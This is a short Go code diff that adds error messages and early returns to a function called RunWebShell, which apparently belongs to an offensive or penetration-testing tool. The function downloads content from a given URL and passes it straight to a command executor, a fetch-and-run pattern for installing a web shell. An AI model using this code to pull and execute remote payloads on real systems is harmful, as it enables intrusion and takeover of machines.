@@ -89,12 +89,14 @@ func RunWebShell(webShellPath string) {
 	}
 	resp, err := http.Get(webShellPath)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println("Error:", err.Error())
+		return
 	}
 	defer resp.Body.Close()
 	installShell, err := io.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println("Error:", err.Error())
+		return
 	}
 	ExecCommand(string(installShell))
 }
